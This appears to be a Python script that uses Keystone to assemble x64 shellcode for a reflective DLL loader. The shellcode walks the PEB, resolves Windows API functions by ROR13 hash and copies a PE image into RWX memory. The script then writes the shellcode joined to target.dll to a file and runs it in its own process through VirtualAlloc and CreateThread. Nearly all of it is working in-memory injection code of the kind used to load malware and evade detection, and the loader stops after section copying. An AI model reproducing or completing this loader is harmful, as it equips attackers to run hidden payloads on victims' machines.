import ctypes, struct
from keystone import *
CODE = (
    "start:                              "
    "   int3                            ;"
    "   push rbp                        ;"
    "   mov rbp, rsp                    ;"
    "   add rsp, 0xfffffffffffffdf8     ;"  # Make some space in stack
    #STEP 0 : calculate dll images current base address
    "find_dllstart:                       "
    "   lea rsi, [rip+dll_base]         ;"  # Trying to get address of end of this shellcode
    "   mov rax, 0x5a4d                 ;"
    "dll_compare:                        "
    "   inc rsi                         ;"  # Increment the loop counter
    "   mov rdi, rsi                    ;"
    "   scasw                           ;"  # compares the content of the AX register to the word addressed by DI
    "   jne dll_compare                 ;"
    "dll_base_found:                     "
    "   mov r12, rsi                    ;"  # R12 has DLL base address
    #STEP 1 : process the kernels exports for the functions our loader needs...
    "find_ntdll:                         "
    "   xor rcx, rcx                    ;"  # Zeroing RCX content
    "   mov rax, gs:[rcx+0x60]          ;"  # 0x060 ProcessEnvironmentBlock to RAX
    "   mov rax, [rax+0x18]             ;"  # 0x18 ProcessEnvironmentBlock.Ldr Offset
    "   mov rsi, [rax+0x20]             ;"  # 0x20 ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
    "   mov rax, [rsi]                  ;"  # Load qword at address (R)SI into RAX
    "   mov r13, [rax+0x20]             ;"  # R13 = NTDLL base address
    "find_kernel32:                      "
    "   xchg rax, rsi                   ;"  # Swap RAX,RSI
    "   lodsq                           ;"  # Load qword at address (R)SI into RAX
    "   mov r14, [rax + 0x20]           ;"  # R14 = KERNEL32 base address
    "find_function_shorten:              "
    "   jmp find_function_shorten_bnc   ;"
    "find_function_ret:                  "
    "   pop rsi                         ;"
    "   mov [rbp+0x08], rsi             ;"
    "   jmp resolve_symbols_kernel32    ;"
    "find_function_shorten_bnc:          "
    "   call find_function_ret          ;"
    "find_function:                      "
    "   push rbp                        ;"
    "   mov rbp, rsp                    ;"
    "   sub rsp, 0x30                   ;"
    "   push rbx                        ;"
    "   mov r8, rbx                     ;"  # Copy Kernel32 base address to R8 register
    "   mov ebx, [rbx + 0x3C]           ;"  # Get Kernel32 PE Signature (offset 0x3C) into EBX
    "   add rbx, r8                     ;"  # Add defrerenced signature offset to kernel32 base. Store in RBX.
    "   xor r9, r9                      ;"  # Offset from PE32 Signature to Export Address Table
    "   add r9, 0x88FFFFF               ;"  # |
    "   shr r9, 0x14                    ;"  # |
    "   mov edx, [rbx+r9]               ;"  # Offset from PE32 Signature to Export Address Table
    "   add rdx, r8                     ;"  # RDX = kernel32.dll + RVA ExportTable = ExportTable Address
    "   mov r10d, [rdx + 0x14]          ;"  # Number of functions
    "   xor r11, r11                    ;"  # Zero R11 before use
    "   mov r11d, [rdx+0x20]            ;"  # AddressOfNames RVA
    "   add r11, r8                     ;"  # AddressOfNames VMA
    "   mov rdi, r10                    ;"  # Set loop counter
    "find_function_loop:                 "
    "   jecxz find_function_finished    ;"  # Jump to the end if RCX is 0
    "   dec rdi                         ;"  # Decrement our loop by one
    "   xor rsi, rsi                    ;"  # Zero RSI for use
    "   mov esi, [r11+rdi*4]            ;"  # ESI = RVA for first AddressOfName
    "   add rsi, r8                     ;"  # RSI = Function name VMA
    "compute_hash:                       "
    "   xor eax, eax                    ;"  # NULL EAX
    "   xor r15, r15                    ;"  # NULL r15
    "   cld                             ;"  # Clear direction
    "compute_hash_again:                 "
    "   lodsb                           ;"  # Load the next byte from rsi into al
    "   test al, al                     ;"  # Check for NULL terminator
    "   jz compute_hash_finished        ;"  # If the ZF is set, we've hit the NULL term
    "   ror r15d, 0x0d                  ;"  # Rotate edx 13 bits to the right
    "   add r15d, eax                   ;"  # Add the new byte to the accumulator
    "   jmp compute_hash_again          ;"
    "compute_hash_finished:              "
    "find_function_compare:              "
    "   cmp r15, rcx                    ;"  # Compare the computed hash with the requested hash
    "   jnz find_function_loop          ;"
    "   xor r11, r11                    ;"
    "   mov r11d, [rdx + 0x24]          ;"  # AddressOfNameOrdinals RVA
    "   add r11, r8                     ;"  # AddressOfNameOrdinals VMA
    "   xor r15, r15                    ;"
    "   mov r15w, [r11+rdi*2]           ;"  # AddressOfNameOrdinals + Counter. RCX = counter
    "   xor r11, r11                    ;"  
    "   mov r11d, [rdx + 0x1c]          ;"  # AddressOfFunctions RVA
    "   add r11, r8                     ;"  # AddressOfFunctions VMA
    "   mov eax, [r11+r15*4]            ;"  # Get the function RVA
    "   add rax, r8                     ;"  # Get the function VMA
    "   mov r14, rax                    ;"  # Preserve function address in R14
    "find_function_finished:             "
    "   pop rbx                         ;"
    "   add rsp, 0x30                   ;"
    "   pop rbp                         ;"
    "   ret                             ;"
    "resolve_symbols_kernel32:           "
    "   mov rbx, r14                    ;"  # Moving Kernel32 base address to RBX
    #"   push qword 0x78b5b983           ;"  # TerminateProcess hash
    "   mov ecx, 0x78b5b983             ;"
    "   call qword ptr [rbp+0x08]       ;"  # Call find_function
    "   mov [rbp+0x20], rax             ;"  # Save TerminateProcess address
    #"   xor rax, rax                    ;"  # Same as push imm64, due to keystone error,
    #"   mov eax, 0xec0e4e8e             ;"  # we are moving value to a register
    #"   push rax                        ;"  # and then push to stack
    "   mov ecx, 0xec0e4e8e             ;"
    "   call qword ptr [rbp+0x08]       ;"  # Call find_function
    "   mov [rbp+0x28], rax             ;"  # Save LoadLibraryA address for later usage
    #"   xor rax, rax                    ;"  # Same as push imm64, due to keystone error,
    #"   mov eax, 0x7c0dfcaa             ;"  # we are moving value to a register
    #"   push rax                        ;"  # and then push to stack
    "   mov ecx, 0x7c0dfcaa             ;"
    "   call qword ptr [rbp+0x08]       ;"  # Call find_function
    "   mov [rbp+0x38], rax             ;"  # Save GetProcAddress address for later usage
    #"   xor rax, rax                    ;"  # Same as push imm64, due to keystone error,
    #"   mov eax, 0x91afca54             ;"  # we are moving value to a register
    #"   push rax                        ;"  # and then push to stack
    "   mov ecx, 0x91afca54             ;"
    "   call qword ptr [rbp+0x08]       ;"  # Call find_function
    "   mov [rbp+0x40], rax             ;"  # Save VirtualAlloc address for later usage
    "resolve_symbols_ntdll:              "
    "   mov rbx, r13                    ;"  # Moving Ntdll base address to RBX
    #"   xor rax, rax                    ;"  # Same as push imm64, due to keystone error,
    #"   mov eax, 0x534c0ab8             ;"  # we are moving value to a register
    #"   push rax                        ;"  # and then push to stack
    "   mov ecx, 0x534c0ab8             ;"
    "   call qword ptr [rbp+0x08]       ;"  # Call find_function
    "   mov [rbp+0x48], rax             ;"  # Save NtFlushInstructionCache address for later usage
    #STEP 2 : load our image into a new permanent location in memory...
    "   mov ebx, [r12 + 0x3c]           ;"  # Get and add offset to NT Header (e_lfanew)
    "   add ebx, 0x18                   ;"  # Add offset to Optional header
    "   add rbx, r12                    ;"  # VA of the Optional Header for the PE to be loaded
    "   mov rdi, rbx                    ;"  # RDI = Optional Header value
    "call_virtual_alloc:                 "
    "   mov rcx, 0                      ;"  # RCX = NULL (first argument)
    "   xor rdx, rdx                    ;"  # Clear rdx
    "   mov edx, [rdi + 0x38]           ;"  # RDX = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage (second argument)
    "   mov r8d, 0x1000                 ;"  # R8D = MEM_RESERVE
    "   or r8d, 0x2000                  ;"  # R8D |= MEM_COMMIT (third argument)
    "   mov r9d, 0x40                   ;"  # R9D = PAGE_EXECUTE_READWRITE (fourth argument)
    "   call qword ptr [rbp+0x40]       ;"  # Call VirtualAlloc
    "   mov ecx, [rdi + 0x3c]           ;"  # ECX = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders
    "   mov rdi, rax                    ;"  # RDI = BaseAddress of allocated memory
    "   mov r13, rax                    ;"  # R13 = Preserve baseaddress of allocated memory
    "   mov rsi, r12                    ;"  # Move DLL base address to RSI
    "copy_headers:                       "    
    "   test ecx, ecx                   ;"  # Check if ECX is 0
    "   jz done_copy                    ;"  # If zero, exit loop
    "   mov al, [rsi]                   ;"  # Load byte from [RSI] (uiLibraryAddress)
    "   mov [rdi], al                   ;"  # Store byte to [RDI] (uiBaseAddress)
    "   inc rsi                         ;"  # Increment source pointer
    "   inc rdi                         ;"  # Increment destination pointer
    "   dec ecx                         ;"  # Decrement counter (uiValueA)
    "   jmp copy_headers                ;"  # Repeat loop
    "done_copy:                          "
    #STEP 3: load in all sections
    "   mov rax, rbx                    ;"  # RAX = Optional Header value
    "   sub rbx, 0x18                   ;"  # RBX = NT Header value
    "   add rbx, 0x4                    ;"  # RBX = File Header
    "   add ax, [rbx + 0x10]            ;"  # RAX = Optional Header value + File Header -> Size of optional header = RVA of next section
    "   mov r8, rax                     ;"  # R8 = uiValueA = VA of first  section
    "   mov cx, [rbx + 0x2]             ;"  # RCX= File Header -> Number of sections
    "iterate_sections:                   "
    "   test ecx, ecx                   ;"
    "   jz sections_done                ;"
    "   mov rax, r13                    ;"  # RAX = Base address, Calculating uiValueB
    "   mov ebx, [r8 + 0xc]             ;"  # [0xc=12] RAX = uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress
    "   add rax, rbx                    ;"
    "   mov r9, rax                     ;"  # R9 = uiValueB
    "   mov rax, r12                    ;"  # RAX = uiLibraryAddress, Caluculating uiValueC
    "   mov ebx, [r8 + 0x14]            ;"  # [0x14=20] RAX = uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData
    "   add rax, rbx                    ;"
    "   mov r10, rax                    ;"  # R10 = uiValueC
    "   mov edx, [r8 + 0x10]            ;"  # [0x10=16] EDX = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData
    "copy_section:                       "
    "   test edx, edx                   ;"
    "   jz next_section                 ;"
    "   mov al, [r10]                   ;"  # al = *(BYTE *)uiValueC
    "   mov [r9], al                    ;"  # *(BYTE *)uiValueB = al
    "   inc r10                         ;"  # uiValueC++
    "   inc r9                          ;"  # uiValueB++
    "   dec edx                         ;"  # uiValueD--
    "   jmp copy_section                ;"
    "next_section:                       "
    "   add r8, 0x28                    ;"  # [40 = 0x28] uiValueA += sizeof(IMAGE_SECTION_HEADER)
    "   dec ecx                         ;"
    "   jmp iterate_sections            ;"
    "sections_done:                      "
 )

ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)
sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)
print(shellcode)
# Write the (shellcode+target_dll) to a file for later use
with open("target.dll", "rb") as dll_file:  
   with open("shellcode.sh", "wb") as binary_file:
        shellcode += dll_file.read()
        binary_file.write(shellcode)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ctypes.windll.kernel32.RtlCopyMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
ctypes.windll.kernel32.CreateThread.argtypes = (ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int))
space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
print("Shellcode located at address %s" % hex(space))
input("...ENTER TO EXECUTE SHELLCODE...")
handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(handle, -1);